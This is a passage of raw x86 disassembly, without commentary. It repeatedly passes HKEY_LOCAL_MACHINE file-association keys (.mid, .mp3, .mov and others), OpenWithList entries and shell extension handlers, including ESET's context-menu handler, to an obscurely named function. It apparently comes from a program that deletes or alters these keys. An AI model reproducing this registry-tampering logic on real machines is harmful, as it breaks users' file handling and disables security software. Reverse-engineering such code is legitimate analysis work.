  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001D7h
  push 00423FBCh ; "SOFTWARE\Classes\.m3u\OpenWithProgIds"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001D8h
  push 0042400Ch ; "SOFTWARE\Classes\.m3u\PersistentHandler"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001D9h
  push 00424060h ; "SOFTWARE\Classes\.m3u"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001DAh
  push 00424090h ; "SOFTWARE\Classes\.m4a"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001DBh
  push 004240C0h ; "SOFTWARE\Classes\.m4v"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001DCh
  push 004240F0h ; "SOFTWARE\Classes\.man"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001DDh
  push 00424120h ; "SOFTWARE\Classes\.manifest"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001DEh
  push 0042415Ch ; "SOFTWARE\Classes\.MAPIMail\PersistentHandler"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001DFh
  push 004241BCh ; "SOFTWARE\Classes\.MAPIMail"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001E0h
  push 0042423Ch ; "SOFTWARE\Classes\.mdb\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001E1h
  push 004241BCh ; "SOFTWARE\Classes\.MAPIMail"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001E2h
  push 00424290h ; "SOFTWARE\Classes\.mfp"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001E3h
  push 004242C0h ; "SOFTWARE\Classes\.mht"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001E4h
  push 004242F0h ; "SOFTWARE\Classes\.mhtml"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001E5h
  push 00424324h ; "SOFTWARE\Classes\.mid\OpenWithList\wmplayer.exe"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001E6h
  push 00424388h ; "SOFTWARE\Classes\.mid\OpenWithList"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001E7h
  push 0042441Ch ; "SOFTWARE\Classes\.mid\OpenWithProgIds"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001E8h
  push 0042446Ch ; "SOFTWARE\Classes\.mid\PersistentHandler"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001E9h
  push 004244C0h ; "SOFTWARE\Classes\.mid"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001EAh
  push 004244F0h ; "SOFTWARE\Classes\.midi\OpenWithList\wmplayer.exe"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001EBh
  push 00424558h ; "SOFTWARE\Classes\.midi\OpenWithList"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001ECh
  push 004245A4h ; "SOFTWARE\Classes\.midi\OpenWithProgIds"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001EDh
  push 004245F8h ; "SOFTWARE\Classes\.midi\PersistentHandler"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001EEh
  push 00424650h ; "SOFTWARE\Classes\.midi"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001EFh
  push 00424684h ; "SOFTWARE\Classes\.mkv"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001F0h
  push 004246B4h ; "SOFTWARE\Classes\.mmf\PersistentHandler"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001F1h
  push 00424708h ; "SOFTWARE\Classes\.mmf"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001F2h
  push 00424738h ; "SOFTWARE\Classes\.mmm"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001F3h
  push 00424768h ; "SOFTWARE\Classes\.mov\PersistentHandler"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001F4h
  push 004243D4h ; "SOFTWARE\Classes\.mov"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001F5h
  push 004247D8h ; "SOFTWARE\Classes\.movie\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001F6h
  push 00424830h ; "SOFTWARE\Classes\.movie"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001F7h
  push 00424864h ; "SOFTWARE\Classes\.mp2\OpenWithList\wmplayer.exe"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001F8h
  push 004248C8h ; "SOFTWARE\Classes\.mp2\OpenWithList"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001F9h
  push 00424914h ; "SOFTWARE\Classes\.mp2\OpenWithProgIds"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001FAh
  push 00424964h ; "SOFTWARE\Classes\.mp2\PersistentHandler"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001FBh
  push 004241F8h ; "SOFTWARE\Classes\.mp2"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001FCh
  push 004249B8h ; "SOFTWARE\Classes\*\OpenWithList\Excel.exe"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001FDh
  push 00424A10h ; "SOFTWARE\Classes\*\OpenWithList\IExplore.exe"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001FEh
  push 00424A70h ; "SOFTWARE\Classes\*\OpenWithList\Notepad.exe"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000001FFh
  push 00424ACCh ; "SOFTWARE\Classes\*\OpenWithList\Winword.exe"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000200h
  push 00424B28h ; "SOFTWARE\Classes\*\OpenWithList\WordPad.exe"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000201h
  push 0041E7B8h ; "SOFTWARE\Classes\*\OpenWithList"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000202h
  push 00424BA0h ; "SOFTWARE\Classes\*\shellex\ContextMenuHandlers\{a2a9545d-a0c2-42b4-9708-a0b2badd77c8}"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000203h
  push 00424C50h ; "SOFTWARE\Classes\*\shellex\ContextMenuHandlers\ESET Smart Security - Context Menu Shell Extension"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000204h
  push 00424D88h ; "SOFTWARE\Classes\*\shellex\ContextMenuHandlers\Offline Files"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000205h
  push 00424E08h ; "SOFTWARE\Classes\*\shellex\ContextMenuHandlers\Open With"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000206h
  push 00424E80h ; "SOFTWARE\Classes\*\shellex\ContextMenuHandlers\Open With EncryptionMenu"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000207h
  push 00424D18h ; "SOFTWARE\Classes\*\shellex\ContextMenuHandlers\WinRAR"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000208h
  push 00424F14h ; "SOFTWARE\Classes\*\shellex\ContextMenuHandlers"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000209h
  push 00424F78h ; "SOFTWARE\Classes\*\shellex\PropertySheetHandlers\{1F2E5C40-9550-11CE-99D2-00AA006E086C}"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000020Ah
  push 0042502Ch ; "SOFTWARE\Classes\*\shellex\PropertySheetHandlers\{3EA48300-8CF6-101B-84FB-666CCB9BCD32}"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000020Bh
  push 00425160h ; "SOFTWARE\Classes\*\shellex\PropertySheetHandlers\{883373C3-BF89-11D1-BE35-080036B11A03}"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000020Ch
  push 00425214h ; "SOFTWARE\Classes\*\shellex\PropertySheetHandlers\CryptoSignMenu"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000020Dh
  push 0041E7FCh ; "SOFTWARE\Classes\*\shellex"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000020Eh
  push 0041E838h ; "SOFTWARE\Classes\*"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000020Fh
  push 00425298h ; "SOFTWARE\Classes\.3gp2"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000210h
  push 004252CCh ; "SOFTWARE\Classes\.aifc\OpenWithList\wmplayer.exe"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000211h
  push 004250E0h ; "SOFTWARE\Classes\.aifc\OpenWithList"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000212h
  push 0042534Ch ; "SOFTWARE\Classes\.aifc\OpenWithProgIds"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000213h
  push 004253A0h ; "SOFTWARE\Classes\.aifc\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000214h
  push 004253F8h ; "SOFTWARE\Classes\.aifc"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000215h
  push 0042542Ch ; "SOFTWARE\Classes\.asf"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000216h
  push 0042545Ch ; "SOFTWARE\Classes\.ctl"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000217h
  push 00422D58h ; "SOFTWARE\Classes\.imc"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000218h
  push 0042415Ch ; "SOFTWARE\Classes\.MAPIMail\PersistentHandler"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000219h
  push 004241BCh ; "SOFTWARE\Classes\.MAPIMail"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000021Ah
  push 0042423Ch ; "SOFTWARE\Classes\.mdb\PersistentHandler"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000021Bh
  push 0042548Ch ; "SOFTWARE\Classes\.mdb"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000021Ch
  push 00424290h ; "SOFTWARE\Classes\.mfp"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000021Dh
  push 004242C0h ; "SOFTWARE\Classes\.mht"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000021Eh
  push 004242F0h ; "SOFTWARE\Classes\.mhtml"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000021Fh
  push 00424324h ; "SOFTWARE\Classes\.mid\OpenWithList\wmplayer.exe"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000220h
  push 00424388h ; "SOFTWARE\Classes\.mid\OpenWithList"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000221h
  push 0042441Ch ; "SOFTWARE\Classes\.mid\OpenWithProgIds"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000222h
  push 0042446Ch ; "SOFTWARE\Classes\.mid\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000223h
  push 004244C0h ; "SOFTWARE\Classes\.mid"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000224h
  push 004244F0h ; "SOFTWARE\Classes\.midi\OpenWithList\wmplayer.exe"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000225h
  push 00424558h ; "SOFTWARE\Classes\.midi\OpenWithList"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000226h
  push 004245A4h ; "SOFTWARE\Classes\.midi\OpenWithProgIds"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000227h
  push 004245F8h ; "SOFTWARE\Classes\.midi\PersistentHandler"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000228h
  push 00424650h ; "SOFTWARE\Classes\.midi"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000229h
  push 00424684h ; "SOFTWARE\Classes\.mkv"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000022Ah
  push 004246B4h ; "SOFTWARE\Classes\.mmf\PersistentHandler"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000022Bh
  push 00424708h ; "SOFTWARE\Classes\.mmf"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000022Ch
  push 00424738h ; "SOFTWARE\Classes\.mmm"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000022Dh
  push 00424768h ; "SOFTWARE\Classes\.mov\PersistentHandler"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000022Eh
  push 004243D4h ; "SOFTWARE\Classes\.mov"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000022Fh
  push 004247D8h ; "SOFTWARE\Classes\.movie\PersistentHandler"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000230h
  push 00424830h ; "SOFTWARE\Classes\.movie"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000231h
  push 00424864h ; "SOFTWARE\Classes\.mp2\OpenWithList\wmplayer.exe"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000232h
  push 004248C8h ; "SOFTWARE\Classes\.mp2\OpenWithList"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000233h
  push 00424914h ; "SOFTWARE\Classes\.mp2\OpenWithProgIds"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000234h
  push 00424964h ; "SOFTWARE\Classes\.mp2\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000235h
  push 004241F8h ; "SOFTWARE\Classes\.mp2"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000236h
  push 004254BCh ; "SOFTWARE\Classes\*\shellex\PropertySheetHandlers"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000237h
  push 0041E7FCh ; "SOFTWARE\Classes\*\shellex"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000238h
  push 00425524h ; "SOFTWARE\Classes\*\OpenWithList\MSPaint.exe"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000239h
  push 0041E7B8h ; "SOFTWARE\Classes\*\OpenWithList"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000023Ah
  push 0041E838h ; "SOFTWARE\Classes\*"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000023Bh
  push 00425580h ; "SOFTWARE\Classes\.mp2v\PersistentHandler"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000023Ch
  push 004255D8h ; "SOFTWARE\Classes\.mp2v\OpenWithProgIds"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000023Dh
  push 0042562Ch ; "SOFTWARE\Classes\.mp2v\OpenWithList\wmplayer.exe"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000023Eh
  push 00425694h ; "SOFTWARE\Classes\.mp2v\OpenWithList"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000023Fh
  push 0042512Ch ; "SOFTWARE\Classes\.mp2v"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000240h
  push 00425708h ; "SOFTWARE\Classes\.mp3\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000241h
  push 0042575Ch ; "SOFTWARE\Classes\.mp3\OpenWithProgIds"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000242h
  push 004257ACh ; "SOFTWARE\Classes\.mp3\OpenWithList\wmplayer.exe"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000243h
  push 00425810h ; "SOFTWARE\Classes\.mp3\OpenWithList"
